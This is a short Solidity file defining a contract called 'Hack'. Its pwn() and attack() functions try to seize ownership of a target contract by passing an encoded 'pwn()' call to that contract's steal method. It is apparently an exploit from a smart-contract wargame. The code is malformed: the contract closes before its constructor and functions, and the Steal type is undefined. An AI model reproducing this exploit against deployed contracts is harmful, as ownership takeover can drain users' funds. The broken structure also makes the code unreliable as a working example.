// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Hack {
    address private owner;

}

constructor() {
    owner = msg.sender;
}

function pwn() external {
    owner = tx.origin;

}

function attack(Steal st) external {
    require(msg.sender == owner);
    st.steal(address(this), abi.encodeWithSignature("pwn()"));
    }


